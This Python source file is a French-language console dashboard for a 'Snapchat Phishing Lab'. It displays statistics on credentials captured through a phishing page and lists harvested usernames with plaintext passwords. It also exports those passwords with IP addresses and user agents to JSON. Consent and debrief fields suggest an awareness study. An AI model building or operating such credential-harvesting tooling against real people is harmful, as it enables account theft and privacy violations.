"""
Snapchat Phishing Lab — Dashboard Interactif
Lance avec : python dashboard.py
"""

import sqlite3
import json
from datetime import datetime
import os

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captured_credentials.db")


def get_conn():
    return sqlite3.connect(DB_PATH)


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def print_header():
    print("=" * 60)
    print("  SNAPCHAT PHISHING LAB — DASHBOARD")
    print("=" * 60)


def show_stats():
    conn = get_conn()
    c = conn.cursor()

    c.execute("SELECT COUNT(*) FROM captured_credentials")
    total = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM captured_credentials WHERE password != '' AND password IS NOT NULL")
    with_pw = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'")
    sessions = c.fetchone()[0]

    c.execute("SELECT COUNT(DISTINCT participant_id) FROM captured_credentials")
    unique_users = c.fetchone()[0]

    c.execute("SELECT DATE(timestamp), COUNT(*) FROM captured_credentials GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7")
    daily = c.fetchall()

    conn.close()

    print("\n[STATISTIQUES]")
    print(f"  Sessions démarrées :     {sessions}")
    print(f"  Identifiants capturés :  {total}")
    print(f"  Avec mot de passe :      {with_pw}")
    print(f"  Participants uniques :   {unique_users}")
    if sessions > 0:
        print(f"  Taux de conversion :     {round(total / sessions * 100, 1)}%")
    print()
    if daily:
        print("  Derniers 7 jours :")
        for d, cnt in daily:
            print(f"    {d}: {cnt} capture(s)")
    print()


def list_credentials(show_pw=True):
    conn = get_conn()
    rows = conn.execute(
        "SELECT id, participant_id, username, password, timestamp FROM captured_credentials ORDER BY id DESC"
    ).fetchall()
    conn.close()

    if not rows:
        print("\n  Aucune donnée capturée.\n")
        return

    print(f"\n[CREDENTIALS] ({len(rows)} entrées)")
    print(f"  {'ID':<4} {'Participant':<24} {'Username':<20} {'Password':<20} {'Date'}")
    print(f"  {'-'*4} {'-'*24} {'-'*20} {'-'*20} {'-'*19}")
    for r in rows:
        pw = r[3] if show_pw and r[3] else "***" if r[3] else "(vide)"
        print(f"  {r[0]:<4} {r[1]:<24} {r[2] or '(vide)':<20} {pw:<20} {r[4]}")
    print()


def show_log():
    conn = get_conn()
    rows = conn.execute("SELECT id, event_type, participant_id, details, timestamp FROM experiment_log ORDER BY id DESC LIMIT 30").fetchall()
    conn.close()

    if not rows:
        print("\n  Aucun log.\n")
        return

    print(f"\n[LOGS] (30 derniers)")
    print(f"  {'ID':<4} {'Event':<20} {'Participant':<24} {'Date'}")
    print(f"  {'-'*4} {'-'*20} {'-'*24} {'-'*19}")
    for r in rows:
        print(f"  {r[0]:<4} {r[1]:<20} {r[2] or '-':<24} {r[4]}")
    print()


def export_json(show_pw=True):
    conn = get_conn()
    rows = conn.execute(
        "SELECT participant_id, username, password, ip_address, user_agent, timestamp, consent_given, debriefed FROM captured_credentials"
    ).fetchall()
    conn.close()

    data = []
    for r in rows:
        entry = {
            "participant_id": r[0],
            "username": r[1] if show_pw else "(masqué)",
            "password": r[2] if show_pw else "(masqué)" if r[2] else "",
            "username_length": len(r[1]) if r[1] else 0,
            "password_length": len(r[2]) if r[2] else 0,
            "ip": r[3],
            "user_agent": r[4],
            "timestamp": r[5],
            "consent": bool(r[6]),
            "debriefed": bool(r[7]),
        }
        data.append(entry)

    path = os.path.join(os.path.dirname(DB_PATH), "export.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    print(f"\n  Exporté vers {path} ({len(data)} entrées)\n")


def reset_data():
    conn = get_conn()
    c = conn.cursor()
    c.execute("DELETE FROM captured_credentials")
    c.execute("DELETE FROM experiment_log")
    conn.commit()
    conn.close()
    print("\n  Données réinitialisées.\n")


def main():
    while True:
        cls()
        print_header()
        print()
        print("  1. Statistiques")
        print("  2. Lister les credentials (mots de passe cachés)")
        print("  3. Lister les credentials (mots de passe visibles)")
        print("  4. Logs d'activité")
        print("  5. Exporter en JSON")
        print("  6. Réinitialiser les données")
        print("  0. Quitter")
        print()
        choice = input("  Choix > ").strip()

        if choice == "1":
            cls()
            print_header()
            show_stats()
            input("  Appuie sur Entrée pour continuer...")
        elif choice == "2":
            cls()
            print_header()
            list_credentials(show_pw=False)
            input("  Appuie sur Entrée pour continuer...")
        elif choice == "3":
            cls()
            print_header()
            list_credentials(show_pw=True)
            input("  Appuie sur Entrée pour continuer...")
        elif choice == "4":
            cls()
            print_header()
            show_log()
            input("  Appuie sur Entrée pour continuer...")
        elif choice == "5":
            cls()
            print_header()
            export_json()
            input("  Appuie sur Entrée pour continuer...")
        elif choice == "6":
            cls()
            print_header()
            confirm = input("  Sûr ? (oui/non) > ").strip().lower()
            if confirm == "oui":
                reset_data()
            else:
                print("  Annulé.")
            input("  Appuie sur Entrée pour continuer...")
        elif choice == "0":
            print("\n  Bye.\n")
            break


if __name__ == "__main__":
    main()
